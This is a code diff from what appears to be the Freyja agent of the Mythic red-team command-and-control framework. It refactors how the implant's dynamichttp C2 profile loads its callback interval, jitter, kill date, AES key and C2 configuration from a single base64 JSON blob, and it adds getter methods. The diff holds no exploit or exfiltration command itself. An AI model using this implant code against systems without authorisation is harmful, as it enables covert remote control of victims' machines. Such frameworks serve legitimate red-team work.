@@ -27,14 +27,17 @@ import (
 	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils/structs"
 )
 
-// All variables must be a string so they can be set with ldflags
-var dynamichttp_callback_jitter string
-var dynamichttp_callback_interval string
-var dynamichttp_killdate string
-var dynamichttp_encrypted_exchange_check string
-var dynamichttp_raw_c2_config string
-var dynamichttp_AESPSK string
+// base64 encoded version of the JSON initial configuration of dynamichttp
+var dynamichttp_initial_config string
 
+type DynamicHTTPInitialConfig struct {
+	Killdate               string                `json:"killdate"`
+	Interval               uint                  `json:"callback_interval"`
+	Jitter                 uint                  `json:"callback_jitter"`
+	EncryptedExchangeCheck bool                  `json:"encrypted_exchange_check"`
+	AESPSK                 string                `json:"AESPSK"`
+	RawC2Config            C2DynamicHTTPC2Config `json:"raw_c2_config"`
+}
 type C2DynamicHTTPFunction struct {
 	Function   string   `json:"function"`
 	Parameters []string `json:"parameters"`
@@ -79,44 +82,45 @@ type C2DynamicHTTP struct {
 
 // New creates a new DynamicHTTP C2 profile from the package's global variables and returns it
 func init() {
-	killDateString := fmt.Sprintf("%sT00:00:00.000Z", dynamichttp_killdate)
+	initialConfigBytes, err := base64.StdEncoding.DecodeString(dynamichttp_initial_config)
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("error trying to decode initial dynamichttp config, exiting: %v\n", err))
+		os.Exit(1)
+	}
+	initialConfig := DynamicHTTPInitialConfig{}
+	err = json.Unmarshal(initialConfigBytes, &initialConfig)
+	if err != nil {
+		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial dynamichttp config, exiting: %v\n", err))
+		os.Exit(1)
+	}
+	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
 	if err != nil {
 		utils.PrintDebug("Kill date failed to parse. Exiting.")
 		os.Exit(1)
 	}
 	profile := C2DynamicHTTP{
-		Key:            dynamichttp_AESPSK,
+		Key:            initialConfig.AESPSK,
 		Killdate:       killDateTime,
 		ShouldStop:     true,
 		stoppedChannel: make(chan bool, 1),
 	}
 
 	// Convert sleep from string to integer
-	i, err := strconv.Atoi(dynamichttp_callback_interval)
-	if err == nil {
-		profile.Interval = i
-	} else {
-		profile.Interval = 10
+	profile.Interval = int(initialConfig.Interval)
+	if profile.Interval < 0 {
+		profile.Interval = 0
 	}
 
 	// Convert jitter from string to integer
-	j, err := strconv.Atoi(dynamichttp_callback_jitter)
-	if err == nil {
-		profile.Jitter = j
-	} else {
-		profile.Jitter = 23
+	profile.Jitter = int(initialConfig.Jitter)
+	if profile.Jitter < 0 {
+		profile.Jitter = 0
 	}
 
 	// Add Agent Configuration
-	//json.Unmarshal([]byte("[{\"name\": \"User-Agent\",\"key\": \"User-Agent\",\"value\": \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\"}]"), &profile.HeaderList)
-	if err := json.Unmarshal([]byte(dynamichttp_raw_c2_config), &profile.Config); err != nil {
-		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal agent configuration: %v\n", err))
-		os.Exit(1)
-	}
-	if dynamichttp_encrypted_exchange_check == "true" {
-		profile.ExchangingKeys = true
-	}
+	profile.Config = initialConfig.RawC2Config
+	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck
 	RegisterAvailableC2Profile(&profile)
 }
 
@@ -220,6 +224,15 @@ func (c *C2DynamicHTTP) GetSleepTime() int {
 	} else {
 		return c.Interval
 	}
+}
+func (c *C2DynamicHTTP) GetSleepInterval() int {
+	return c.Interval
+}
+func (c *C2DynamicHTTP) GetSleepJitter() int {
+	return c.Jitter
+}
+func (c *C2DynamicHTTP) GetKillDate() time.Time {
+	return c.Killdate
 }
 func (c *C2DynamicHTTP) SetSleepInterval(interval int) string {
 	if interval >= 0 {
